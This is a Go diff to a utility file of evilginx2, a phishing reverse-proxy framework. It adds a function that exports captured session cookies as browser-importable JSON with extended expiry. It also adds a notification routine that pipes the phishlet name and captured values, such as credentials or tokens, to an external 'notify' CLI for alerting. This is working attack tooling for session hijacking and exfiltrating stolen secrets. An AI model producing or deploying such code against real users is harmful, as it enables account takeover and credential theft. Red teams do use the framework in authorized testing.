@@ -3,13 +3,18 @@ package core
 import (
 	"crypto/rand"
 	"crypto/sha256"
+	"encoding/json"
 	"fmt"
 	"io/fs"
 	"io/ioutil"
 	"os"
+	"os/exec"
 	"strconv"
 	"strings"
 	"time"
+
+	"github.com/kgretzky/evilginx2/database"
+	"github.com/kgretzky/evilginx2/log"
 )
 
 func GenRandomToken() string {
@@ -169,4 +174,78 @@ func GetDurationString(t_now time.Time, t_expire time.Time) (ret string) {
 		}
 	}
 	return
+}
+
+func ModdedCookieTokensToJSON(tokens map[string]map[string]*database.CookieToken) string {
+	type Cookie struct {
+		Path           string `json:"path"`
+		Domain         string `json:"domain"`
+		ExpirationDate int64  `json:"expirationDate"`
+		Value          string `json:"value"`
+		Name           string `json:"name"`
+		HttpOnly       bool   `json:"httpOnly,omitempty"`
+		HostOnly       bool   `json:"hostOnly,omitempty"`
+	}
+
+	var cookies []*Cookie
+	for domain, tmap := range tokens {
+		for k, v := range tmap {
+			c := &Cookie{
+				Path:           v.Path,
+				Domain:         domain,
+				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
+				Value:          v.Value,
+				Name:           k,
+				HttpOnly:       v.HttpOnly,
+			}
+			if domain[:1] == "." {
+				c.HostOnly = false
+				c.Domain = domain[1:]
+			} else {
+				c.HostOnly = true
+			}
+			if c.Path == "" {
+				c.Path = "/"
+			}
+			cookies = append(cookies, c)
+		}
+	}
+
+	json, _ := json.Marshal(cookies)
+	return string(json)
+}
+
+func CheckNotifyInstalled() bool {
+	path, err := exec.LookPath("notify")
+	if err != nil || path == "" {
+		return false
+	}
+	return true
+}
+
+func SendNotification(phishletName, event, capturedValue string, minimal bool) {
+
+	if !CheckNotifyInstalled() {
+		log.Warning("'notify' CLI is not in PATH. Install it from https://github.com/projectdiscovery/notify")
+		return
+	}
+
+	go func() {
+
+		if minimal {
+			capturedValue = ""
+		}
+
+		cmdData := fmt.Sprintf("Phishlet: %s\nMessage:\n%s\n%s", phishletName, event, capturedValue)
+
+		cmd := exec.Command("notify", "-bulk")
+		cmd.Stdin = strings.NewReader(cmdData)
+
+		err := cmd.Run()
+		if err != nil {
+			log.Warning("Failed to send notification: %v", err)
+		} else {
+			log.Success("Notification sent successfully")
+		}
+	}()
 }
